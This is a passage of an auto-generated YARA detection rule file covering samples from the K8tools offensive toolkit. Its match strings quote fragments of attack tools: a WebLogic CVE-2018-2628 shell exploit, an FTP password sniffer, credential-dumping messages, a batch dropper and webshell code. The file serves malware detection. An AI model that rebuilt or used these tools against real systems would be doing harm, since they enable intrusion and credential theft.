      $s3 = "\\list.php" fullword ascii /* score: '8.00'*/
      $s4 = "\\news.php" fullword ascii /* score: '8.00'*/
      $s5 = "\\bbs.php" fullword ascii /* score: '5.00'*/
      $s6 = "L MCY8" fullword ascii /* score: '1.00'*/
      $s7 = "k8bbs(php+mysql)" fullword ascii /* score: '1.00'*/
      $s8 = "fy2V-D" fullword ascii /* score: '1.00'*/
      $s9 = "@@FF$BHp" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 7KB and
      all of them
}

rule k8exe2bat {
   meta:
      description = "K8tools - file k8exe2bat.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0a714e16606f4bb2ff8f071d9f1eba39997929ebe9036689293445e7b36d5c5a"
   strings:
      $x1 = "@Copy /b /y k8tmp k8door.exe" fullword ascii /* score: '34.00'*/
      $s2 = "@start k8door.exe" fullword ascii /* score: '23.00'*/
      $s3 = "k8exe2bat in.exe out.bat" fullword ascii /* score: '12.00'*/
      $s4 = "pr.act.k8_log.ic" fullword ascii /* score: '9.00'*/
      $s5 = "@echo n k8tmp>>k8team" fullword ascii /* score: '7.00'*/
      $s6 = "@echo %x>>k8team" fullword ascii /* score: '4.42'*/
      $s7 = "@echo rcx>>k8team" fullword ascii /* score: '4.42'*/
      $s8 = "@echo e " fullword ascii /* score: '4.00'*/
      $s9 = "@echo w>>k8team" fullword ascii /* score: '4.00'*/
      $s10 = "@echo q>>k8team" fullword ascii /* score: '4.00'*/
      $s11 = "k8exe2bat conver succeed!" fullword ascii /* score: '4.00'*/
      $s12 = "@debug<k8team>nul" fullword ascii /* score: '4.00'*/
      $s13 = "%ld,%x" fullword ascii /* score: '1.00'*/
      $s14 = ">>k8team" fullword ascii /* score: '1.00'*/
      $s15 = "@del k8t*" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9KB and
      ( pe.imphash() == "f478078ef288d56992e3944d72faecf0" or ( 1 of ($x*) or 4 of them ) )
}

rule K8shellcodeLoader {
   meta:
      description = "K8tools - file K8shellcodeLoader.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d2fca9cf9ce146e0a4a3e5581b24de36a29b984377bd60630fa157fd9aae41cb"
   strings:
      $x1 = "K8shellcodeLoader.exe" fullword wide /* score: '36.00'*/
      $s2 = "K8shellcodeLoader" fullword wide /* score: '18.00'*/
      $s3 = "constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s4 = "?,Kz:\"_" fullword ascii /* score: '7.00'*/
      $s5 = "PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDI" ascii /* score: '6.50'*/
      $s6 = "PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDI" ascii /* score: '6.50'*/
      $s7 = "NGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii /* score: '6.50'*/
      $s8 = "T%A* U" fullword ascii /* score: '5.00'*/
      $s9 = "Ny~z- Z?jl" fullword ascii /* score: '5.00'*/
      $s10 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s11 = "RSDS%?t" fullword ascii /* score: '4.00'*/
      $s12 = "L$|Qh0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "abtp\\h" fullword ascii /* score: '4.00'*/
      $s14 = "  2015" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "0InLHHck" fullword ascii /* score: '4.00'*/
      $s16 = "NQfD:f{3" fullword ascii /* score: '4.00'*/
      $s17 = "T$h9T$" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "ForceRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1167 times */
      $s19 = "NoRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1170 times */
      $s20 = "t.9Vlt)" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      ( pe.imphash() == "9dd8c0ff4fc84287e5b766563240f983" or ( 1 of ($x*) or 4 of them ) )
}

rule K8_Mysql______PHP______20151009 {
   meta:
      description = "K8tools - file K8_Mysql爆破PHP脚本20151009.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ac88243d8d28585635b23db13dfc32bc2e861ead2604008fe966bba98e2fb20c"
   strings:
      $s1 = "ckmysql\\pwd.txt" fullword ascii /* score: '11.00'*/
      $s2 = "ckmysql\\ip.txt" fullword ascii /* score: '11.00'*/
      $s3 = "ckmysql" fullword ascii /* score: '8.00'*/
      $s4 = "ckmysql\\ck33.php" fullword ascii /* score: '7.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2KB and
      all of them
}

rule K8PortMap {
   meta:
      description = "K8tools - file K8PortMap.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ab54a346f9ab48b983583d14ff7f616789f4cf471c51ae216008488fc426c653"
   strings:
      $s1 = "EIdNoExecuteSpecified" fullword ascii /* score: '18.00'*/
      $s2 = "OnExecuteX" fullword ascii /* score: '18.00'*/
      $s3 = "TLOGINDIALOG" fullword wide /* score: '17.50'*/
      $s4 = "Database Login" fullword ascii /* score: '15.00'*/
      $s5 = "TLoginDialog" fullword ascii /* score: '15.00'*/
      $s6 = "TPASSWORDDIALOG" fullword wide /* score: '14.50'*/
      $s7 = "No execute handler found." fullword wide /* score: '14.00'*/
      $s8 = "No command handler found.*Error on call Winsock2 library function %s&Error on loading Winsock2 library (%s)" fullword wide /* score: '14.00'*/
      $s9 = "ReplyUnknownCommand4" fullword ascii /* score: '13.00'*/
      $s10 = "TCommonDialog8" fullword ascii /* score: '13.00'*/
      $s11 = "TIdCommandHandlert" fullword ascii /* score: '12.00'*/
      $s12 = "TIdNoCommandHandlerEvent" fullword ascii /* score: '12.00'*/
      $s13 = "TIdBeforeCommandHandlerEvent" fullword ascii /* score: '12.00'*/
      $s14 = "TIdCommandHandlers" fullword ascii /* score: '12.00'*/
      $s15 = "TIdCommandHandler" fullword ascii /* score: '12.00'*/
      $s16 = "OnNoCommandHandlerT" fullword ascii /* score: '12.00'*/
      $s17 = "OnAfterCommandHandler$" fullword ascii /* score: '12.00'*/
      $s18 = "OnBeforeCommandHandler" fullword ascii /* score: '12.00'*/
      $s19 = "TIdCommandEvent" fullword ascii /* score: '12.00'*/
      $s20 = "TPasswordDialog" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "9fcdc09d4d7c3f5d9b6899e53b497bff" or 8 of them )
}

rule K8_VBS___________________________ {
   meta:
      description = "K8tools - file K8_VBS提权脚本免杀生成器.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "82a9aa88e3110e2c202f00f6f50768bd7de6ac1e7caddc0b5e2f7d015c183749"
   strings:
      $s1 = "[K.8].exe" fullword ascii /* score: '16.00'*/
      $s2 = "\\K8adduser.vbs" fullword ascii /* score: '15.00'*/
      $s3 = "LyBu!S" fullword ascii /* score: '4.00'*/
      $s4 = ".PoIE(nL" fullword ascii /* score: '4.00'*/
      $s5 = "vQ%v& " fullword ascii /* score: '1.42'*/
      $s6 = "Z'm!wMB" fullword ascii /* score: '1.00'*/
      $s7 = "K8_VBS" fullword ascii /* score: '1.00'*/
      $s8 = "\"@~[oF" fullword ascii /* score: '1.00'*/
      $s9 = "M;;I8bz" fullword ascii /* score: '1.00'*/
      $s10 = "k7:j]~" fullword ascii /* score: '1.00'*/
      $s11 = "]Ui)iaB" fullword ascii /* score: '1.00'*/
      $s12 = "V7KT~5" fullword ascii /* score: '1.00'*/
      $s13 = "?i*eLX" fullword ascii /* score: '1.00'*/
      $s14 = "/K[tY$" fullword ascii /* score: '1.00'*/
      $s15 = "~MPaYZ" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8tools_mz64 {
   meta:
      description = "K8tools - file mz64.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b294f94c469f43a78a324b5cfecbde0afb3aa0256bbde06ca2718b8c038a9324"
   strings:
      $x1 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)" fullword wide /* score: '46.00'*/
      $x2 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kull_m_registry_RegOpenKeyEx LSA KO" fullword wide /* score: '37.00'*/
      $x3 = "ERROR kuhl_m_lsadump_dcsync ; kull_m_rpc_drsr_ProcessGetNCChangesReply" fullword wide /* score: '37.00'*/
      $x4 = "ERROR kuhl_m_lsadump_lsa ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x5 = "ERROR kuhl_m_lsadump_trust ; kull_m_process_getVeryBasicModuleInformationsForName (0x%08x)" fullword wide /* score: '37.00'*/
      $x6 = "ERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_lsadump_getSamKey KO" fullword wide /* score: '37.00'*/
      $x7 = "ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x%08x)" fullword wide /* score: '37.00'*/
      $x8 = "ERROR kuhl_m_lsadump_netsync ; I_NetServerTrustPasswordsGet (0x%08x)" fullword wide /* score: '34.00'*/
      $x9 = "ERROR kuhl_m_dpapi_chrome ; Input 'Login Data' file needed (/in:\"%%localappdata%%\\Google\\Chrome\\User Data\\Default\\Login Da" wide /* score: '34.00'*/
      $x10 = "ERROR kuhl_m_kernel_processProtect ; Argument /process:program.exe or /pid:processid needed" fullword wide /* score: '34.00'*/
      $x11 = "ERROR kuhl_m_lsadump_getHash ; Unknow SAM_HASH revision (%hu)" fullword wide /* score: '33.00'*/
      $x12 = "ERROR kuhl_m_lsadump_sam ; kull_m_registry_RegOpenKeyEx (SAM) (0x%08x)" fullword wide /* score: '33.00'*/
      $x13 = "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:0x%08x - R:0x%08x)" fullword wide /* score: '33.00'*/
      $x14 = "ERROR kuhl_m_lsadump_changentlm ; Argument /oldpassword: or /oldntlm: is needed" fullword wide /* score: '33.00'*/
      $x15 = "livessp.dll" fullword wide /* reversed goodware string 'lld.pssevil' */ /* score: '33.00'*/
      $x16 = "ERROR kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO" fullword wide /* score: '32.00'*/
      $x17 = "ERROR kuhl_m_lsadump_getKeyFromGUID ; kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x" fullword wide /* score: '32.00'*/
      $x18 = "!!! parts after public exponent are process encrypted !!!" fullword wide /* score: '32.00'*/
      $x19 = "ERROR kuhl_m_lsadump_getSamKey ; RtlEncryptDecryptRC4 KO" fullword wide /* score: '31.00'*/
      $x20 = "ERROR kuhl_m_lsadump_getHash ; RtlEncryptDecryptRC4" fullword wide /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      ( pe.imphash() == "fc751f775e55aacb1c0c763364369f41" or 1 of ($x*) )
}

rule CVE_2018_2628_Weblogic_GetShell {
   meta:
      description = "K8tools - file CVE-2018-2628 Weblogic GetShell.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "72cc7be1e364487db504ab4c672fd7b168b05da62ed8723141a64620a704b0fd"
   strings:
      $x1 = "# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-20" ascii /* score: '47.00'*/
      $x2 = "# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-20" ascii /* score: '47.00'*/
      $s3 = "print('Weblogic GetShell Exploit for CVE-2018-2628')" fullword ascii /* score: '23.01'*/
      $s4 = "#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp" fullword ascii /* score: '23.00'*/
      $s5 = "627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f64654275666665722863" ascii /* score: '23.00'*/ /* hex encoded string 'byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);' */
      $s6 = "6572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c" ascii /* score: '23.00'*/ /* hex encoded string 'ervers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\' */
      $s7 = "print('Usage: exploit [weblogic ip] [weblogic port]')" fullword ascii /* score: '21.00'*/
      $s8 = "print('shell: http://'+dip+':'+str(dport)+\"/bea_wls_internal/wlscmd.jsp\")" fullword ascii /* score: '21.00'*/
      $s9 = "payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)" fullword ascii /* score: '20.00'*/
      $s10 = "652e7072696e74537461636b547261636528293b" ascii /* score: '19.00'*/ /* hex encoded string 'e.printStackTrace();' */
      $s11 = "6368696c642e77616974466f7228293b" ascii /* score: '19.00'*/ /* hex encoded string 'child.waitFor();' */
      $s12 = "sock.send(payload.decode('hex'))" fullword ascii /* score: '18.00'*/
      $s13 = "496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b" ascii /* score: '17.00'*/ /* hex encoded string 'InputStream in = child.getInputStream();' */
      $s14 = "275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c" ascii /* score: '17.00'*/ /* hex encoded string ''[Lweblogic/common/internal/PackageInfo;L' */
      $s15 = "6f75742e7072696e7428222d3e7c22293b" ascii /* score: '17.00'*/ /* hex encoded string 'out.print("->|");' */
      $s16 = "2f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c" ascii /* score: '17.00'*/ /* hex encoded string '/Lorg/apache/commons/fileupload/FileItemHeaders;L' */
      $s17 = "2e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b29" ascii /* score: '17.00'*/ /* hex encoded string '.authenticate(Lweblogic.security.acl.UserInfo;)' */
      $s18 = "7870775021" ascii /* score: '17.00'*/ /* hex encoded string 'xpwP!' */
      $s19 = "50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b" ascii /* score: '17.00'*/ /* hex encoded string 'Process child = Runtime.getRuntime().exec(kcmd);' */
      $s20 = "7d2063617463682028494f457863657074696f6e206529207b" ascii /* score: '17.00'*/ /* hex encoded string '} catch (IOException e) {' */
   condition:
      uint16(0) == 0x2023 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule K8mysqlCmd {
   meta:
      description = "K8tools - file K8mysqlCmd.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "3631c7060ef4fa0dba824753fe264e122c8dcf90a8787fbc363ca5eb0aae2c91"
   strings:
      $s1 = "MysqlCmd20.exe" fullword ascii /* score: '25.00'*/
      $s2 = "MysqlCmd30.exe" fullword ascii /* score: '25.00'*/
      $s3 = "MysqlCmd45.exe" fullword ascii /* score: '25.00'*/
      $s4 = "MysqlCmd40.exe" fullword ascii /* score: '25.00'*/
      $s5 = "MysqlCmd35.exe" fullword ascii /* score: '25.00'*/
      $s6 = "MySql.Data.dll" fullword ascii /* score: '23.00'*/
      $s7 = "}veTP,:?C+ " fullword ascii /* score: '8.42'*/
      $s8 = "nTY.hQz" fullword ascii /* score: '7.00'*/
      $s9 = "8+ 6OG=" fullword ascii /* score: '5.00'*/
      $s10 = "x+ ?{+" fullword ascii /* score: '5.00'*/
      $s11 = "g QLdgl?" fullword ascii /* score: '4.00'*/
      $s12 = "amSeeqbh" fullword ascii /* score: '4.00'*/
      $s13 = "bUzx1%$j@1" fullword ascii /* score: '4.00'*/
      $s14 = "WSwP,1ry" fullword ascii /* score: '4.00'*/
      $s15 = "hjURwQX" fullword ascii /* score: '4.00'*/
      $s16 = "9.GDP;" fullword ascii /* score: '4.00'*/
      $s17 = "PsmX>RBJA" fullword ascii /* score: '4.00'*/
      $s18 = "slPb1kb" fullword ascii /* score: '4.00'*/
      $s19 = "cQee;zh" fullword ascii /* score: '4.00'*/
      $s20 = "xrAvEI.!" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 800KB and
      8 of them
}

rule ______GetTrustedInstaller_0419_K8_ {
   meta:
      description = "K8tools - file 提权GetTrustedInstaller_0419[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c6d1147ca3ffc37de10fb38ceecde39a8b70631ad51b22635f61467c2b795c2d"
   strings:
      $s1 = "K8GetTrustedInstaller.exe" fullword ascii /* score: '27.00'*/
      $s2 = "P0C^Lz" fullword ascii /* score: '6.00'*/
      $s3 = "FpQWNf# " fullword ascii /* score: '4.42'*/
      $s4 = "ZmsW\\Z" fullword ascii /* score: '4.00'*/
      $s5 = "xGRQHl9T" fullword ascii /* score: '4.00'*/
      $s6 = "pD.UpG" fullword ascii /* score: '4.00'*/
      $s7 = "fOzs|pX" fullword ascii /* score: '4.00'*/
      $s8 = "Rijl+bZB" fullword ascii /* score: '4.00'*/
      $s9 = "\\)H,#C" fullword ascii /* score: '2.00'*/
      $s10 = "5Q\\^U] " fullword ascii /* score: '1.42'*/
      $s11 = "0uq3e5-\\Na*" fullword ascii /* score: '1.17'*/
      $s12 = "b WWSt" fullword ascii /* score: '1.00'*/
      $s13 = "?I/^Ly|b q" fullword ascii /* score: '1.00'*/
      $s14 = "]!|PCG" fullword ascii /* score: '1.00'*/
      $s15 = "!64Kgw6" fullword ascii /* score: '1.00'*/
      $s16 = ":Uxkq/" fullword ascii /* score: '1.00'*/
      $s17 = "K=\"Q2f" fullword ascii /* score: '1.00'*/
      $s18 = "xlr9lg" fullword ascii /* score: '1.00'*/
      $s19 = ">b%@8~#" fullword ascii /* score: '1.00'*/
      $s20 = "a]g'ko" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

rule k8ftpsniffer {
   meta:
      description = "K8tools - file k8ftpsniffer.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4d6bab0753c99a8c1c8c9a09e6513274e8e1266cc4085e39150966ab76885551"
   strings:
      $s1 = "print '[*] FTP Login to ' + str(dest)" fullword ascii /* score: '24.00'*/
      $s2 = "sniff(filter=\"tcp port 21\", prn=ftpsniff)" fullword ascii /* score: '17.07'*/
      $s3 = "# -*- coding: UTF-8 -*-" fullword ascii /* score: '16.00'*/
      $s4 = "print '[+] Password: ' + str(pwd[0]).replace(\"\\\\r\\\\n'\",\"\");" fullword ascii /* score: '16.00'*/
      $s5 = "def ftpsniff(pkt):" fullword ascii /* score: '14.00'*/
      $s6 = "dest = pkt.getlayer(IP).dst" fullword ascii /* score: '12.17'*/
      $s7 = "print '[+] Username: ' + str(user[0]).replace(\"\\\\r\\\\n'\",\"\");" fullword ascii /* score: '11.00'*/
      $s8 = "print('FTP Sniffing...');" fullword ascii /* score: '9.07'*/
      $s9 = "import queue" fullword ascii /* score: '9.00'*/
      $s10 = "user = re.findall('(?i)USER (.*)', raw)" fullword ascii /* score: '7.01'*/
      $s11 = "pwd = re.findall('(?i)PASS (.*)', raw)" fullword ascii /* score: '7.00'*/
      $s12 = "#author: k8gege" fullword ascii /* score: '7.00'*/
      $s13 = "from scapy.all import *" fullword ascii /* score: '6.00'*/
      $s14 = "raw = pkt.sprintf('%Raw.load%')" fullword ascii /* score: '4.17'*/
      $s15 = "elif pwd:" fullword ascii /* score: '4.00'*/
      $s16 = "if user:" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      8 of them
}

rule pack_452140a6431f7359982ee68eebedb945f6b1726b {
   meta:
      description = "K8tools - file pack-452140a6431f7359982ee68eebedb945f6b1726b.idx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "cda8096049545f84f6cba71e584d93fd9a1c06fa6bd9fe636c7377bd01b9eee1"
   strings:
      $s1 = "pmRZtUm" fullword ascii /* score: '4.00'*/
      $s2 = "xzZyR\\" fullword ascii /* score: '4.00'*/
      $s3 = "sQGdu8" fullword ascii /* score: '2.00'*/
      $s4 = "?3KM`z" fullword ascii /* score: '1.00'*/
      $s5 = "_e\"1(N.?" fullword ascii /* score: '1.00'*/
      $s6 = "*Wpd'u" fullword ascii /* score: '1.00'*/
      $s7 = "h#pO)xWx" fullword ascii /* score: '1.00'*/
      $s8 = "3ki=9:np" fullword ascii /* score: '1.00'*/
      $s9 = "zNr{Fi]6" fullword ascii /* score: '1.00'*/
      $s10 = "%vh!S64x" fullword ascii /* score: '1.00'*/
      $s11 = ">hZ>7)" fullword ascii /* score: '1.00'*/
      $s12 = "xa(d?[*" fullword ascii /* score: '1.00'*/
      $s13 = "//&}hq(" fullword ascii /* score: '1.00'*/
      $s14 = "G5Qes!;@" fullword ascii /* score: '1.00'*/
      $s15 = "j_?di,a" fullword ascii /* score: '1.00'*/
      $s16 = "7YLg7,gG0" fullword ascii /* score: '1.00'*/
      $s17 = "%uX_hL" fullword ascii /* score: '1.00'*/
      $s18 = "Ib&g?B" fullword ascii /* score: '1.00'*/
      $s19 = "<O/ok'" fullword ascii /* score: '1.00'*/
      $s20 = "/B{W~{" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x74ff and filesize < 90KB and
      8 of them
}

rule K8getTeamViewPWD_20150705_K_8_ {
   meta:
      description = "K8tools - file K8getTeamViewPWD_20150705[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d67c38afa36dabfb06c9620b4e1c0a88b5d0bbe0594ebe338255581ff999042c"
   strings:
      $s1 = "K8getTeamViewPWD.exe-" fullword ascii /* score: '19.00'*/
      $s2 = "EImeT6/" fullword ascii /* score: '4.00'*/
      $s3 = "GbKR[X-" fullword ascii /* score: '4.00'*/
      $s4 = "l6.Kbn" fullword ascii /* score: '4.00'*/
      $s5 = "\\Z:hlG" fullword ascii /* score: '2.00'*/
      $s6 = "\\RaY$G5" fullword ascii /* score: '2.00'*/
      $s7 = "e6||-a~" fullword ascii /* score: '1.00'*/
      $s8 = "Q~n</@," fullword ascii /* score: '1.00'*/
      $s9 = "g:<%\\V" fullword ascii /* score: '1.00'*/
      $s10 = "<g#*'b" fullword ascii /* score: '1.00'*/
      $s11 = "y0rH;H" fullword ascii /* score: '1.00'*/
      $s12 = "%_h}fJ" fullword ascii /* score: '1.00'*/
      $s13 = "}4WsfY" fullword ascii /* score: '1.00'*/
      $s14 = "A&F^:p" fullword ascii /* score: '1.00'*/
      $s15 = "4)%#$B" fullword ascii /* score: '1.00'*/
      $s16 = "a3C{KN" fullword ascii /* score: '1.00'*/
      $s17 = "9;$2|V" fullword ascii /* score: '1.00'*/
      $s18 = "LZ|O]Kk" fullword ascii /* score: '1.00'*/
      $s19 = "]%uq)3" fullword ascii /* score: '1.00'*/
      $s20 = "e8wiZj" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 80KB and
      8 of them
}

rule smbcheck {
   meta:
      description = "K8tools - file smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s7 = "impacket.system_errors(" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s9 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s10 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for PyUnicode_FromFormat" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PySys_GetObject" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PyUnicode_FromString" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for PyObject_SetAttrString" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_DecRef" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for Py_SetProgramName" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for _Py_char2wchar" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      ( pe.imphash() == "fc40519af20116c903e3ff836e366e39" or 8 of them )
}

rule K8tools_K8Cscan {
   meta:
      description = "K8tools - file K8Cscan.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a99c94d2657feb0a534f009edb3f3af252dcd7861a45bad9e85fa3c486bff50f"
   strings:
      $s1 = "# test if target is vulnerable" fullword ascii /* score: '27.00'*/
      $s2 = "#python K8Cscan.py 192.11.22.40/24 -t dll" fullword ascii /* score: '23.00'*/
      $s3 = "#print('Login failed: ' + nt_errors.ERROR_MESSAGES[e.error_code][0])" fullword ascii /* score: '22.00'*/
      $s4 = "conn.login(USERNAME, PASSWORD)" fullword ascii /* score: '22.00'*/
      $s5 = "# print('%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '21.00'*/
      $s6 = "# print('%s\\t%s\\t%s'%(ip,getHostName(ip),SmbVul))" fullword ascii /* score: '21.00'*/
      $s7 = "# output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '21.00'*/
      $s8 = "#Linux not support load 'netscan40.dll' (Maybe Mono is support)" fullword ascii /* score: '20.00'*/
      $s9 = "clr.FindAssembly('netscan40.dll')" fullword ascii /* score: '20.00'*/
      $s10 = "result = socket.gethostbyaddr(target)" fullword ascii /* score: '19.00'*/
      $s11 = "#python K8Cscan.py --type=dll 192.11.22.42" fullword ascii /* score: '19.00'*/
      $s12 = "def getHostName(target):" fullword ascii /* score: '19.00'*/
      $s13 = "#python K8Cscan.py 192.11.22.40/24 -t ms17010" fullword ascii /* score: '18.00'*/
      $s14 = "print('%s\\t%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '17.00'*/
      $s15 = "if(os.path.exists('netscan40.dll')):" fullword ascii /* score: '17.00'*/
      $s16 = "if checkPort(target,'445'):" fullword ascii /* score: '17.00'*/
      $s17 = "print('load netscan40.dll')" fullword ascii /* score: '17.00'*/
      $s18 = "output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '17.00'*/
      $s19 = "print('load netscan40.dll (.net >= 4.0)')" fullword ascii /* score: '17.00'*/
      $s20 = "MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB','1.0'))" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 20KB and
      8 of them
}

rule K8Packwebshell {
   meta:
      description = "K8tools - file K8Packwebshell.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1af14893030942261150691b7b70de3443f33d92d6f266153b78755d27751a88"
   strings:
      $x1 = "<a href=\"http://qqhack8.blog.163.com\" target=\"_blank\">Copyright " fullword ascii /* score: '32.42'*/
      $s2 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m5 -ep1 -o+ -s \\\"\" + txtOutPath.Value + \".Rar" ascii /* score: '30.00'*/
      $s3 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m5 -ep1 -o+ -s \\\"\" + txtOutPath.Value " fullword ascii /* score: '27.00'*/
      $s4 = "TargetFile = System.IO.Path.Combine(basedir, FileName);" fullword ascii /* score: '24.00'*/
